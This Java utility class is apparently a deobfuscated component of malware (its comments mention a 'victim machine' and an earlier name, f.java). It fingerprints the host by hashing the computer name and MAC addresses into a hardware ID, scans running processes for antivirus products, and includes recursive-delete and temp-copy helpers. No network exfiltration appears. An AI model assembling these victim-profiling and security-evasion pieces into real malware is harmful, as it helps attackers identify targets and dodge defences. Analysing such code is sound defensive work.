import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import java.io.File;
import java.io.IOException;
import java.net.NetworkInterface;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.security.MessageDigest;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Map;
import java.util.Random;
import java.util.Set;

/**
 * Cleaned SystemUtils (formerly f.java)
 * Provides low-level system utilities including process management, 
 * HWID generation, and antivirus detection.
 */
public class SystemUtils {
    
    /**
     * Generates a unique Hardware ID (HWID) for the victim machine.
     * Uses computer name, CPU info, and MAC addresses hashed with SHA-256.
     */
    public static String getHWID() {
        try {
            String base = System.getenv("COMPUTERNAME") + "-" + System.getProperty("os.arch");
            Enumeration<NetworkInterface> networks = NetworkInterface.getNetworkInterfaces();
            StringBuilder macs = new StringBuilder();
            while (networks.hasMoreElements()) {
                NetworkInterface net = networks.nextElement();
                byte[] mac = net.getHardwareAddress();
                if (mac != null && !net.isLoopback() && net.isUp()) {
                    for (byte b : mac) macs.append(String.format("%02X", b));
                }
            }
            String combined = base + macs.toString();
            byte[] hash = MessageDigest.getInstance("SHA-256").digest(combined.getBytes());
            StringBuilder hex = new StringBuilder();
            for (byte b : hash) hex.append(String.format("%02x", b));
            return hex.toString().substring(0, 32);
        } catch (Exception e) {
            return "UNKNOWN-" + new Random().nextInt(1000000);
        }
    }

    /**
     * Checks if any known Antivirus or security software is running.
     */
    public static String detectSecuritySoftware() {
        Map<String, String> avMap = Map.of(
            "avp.exe", "Kaspersky",
            "mbam.exe", "Malwarebytes",
            "msmpeng.exe", "Windows Defender",
            "avgui.exe", "AVG",
            "avastui.exe", "Avast"
        );
        
        Tlhelp32.PROCESSENTRY32.ByReference entry = new Tlhelp32.PROCESSENTRY32.ByReference();
        WinDef.HANDLE snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0));
        
        try {
            if (Kernel32.INSTANCE.Process32First(snapshot, entry)) {
                do {
                    String procName = entry.szExeFile.toString().toLowerCase();
                    for (String avProc : avMap.keySet()) {
                        if (procName.contains(avProc)) return avMap.get(avProc);
                    }
                } while (Kernel32.INSTANCE.Process32Next(snapshot, entry));
            }
        } finally {
            Kernel32.INSTANCE.CloseHandle(snapshot);
        }
        return "None Detected";
    }

    /**
     * Recursively deletes a file or directory.
     */
    public static void deleteRecursive(File path) {
        if (path.isDirectory()) {
            File[] files = path.listFiles();
            if (files != null) {
                for (File f : files) deleteRecursive(f);
            }
        }
        path.delete();
    }

    /**
     * Safely copies a file to a temporary location.
     */
    public static File copyToTemp(File source) throws IOException {
        File temp = Files.createTempFile("ira_", ".tmp").toFile();
        Files.copy(source.toPath(), temp.toPath(), StandardCopyOption.REPLACE_EXISTING);
        temp.deleteOnExit();
        return temp;
    }
}
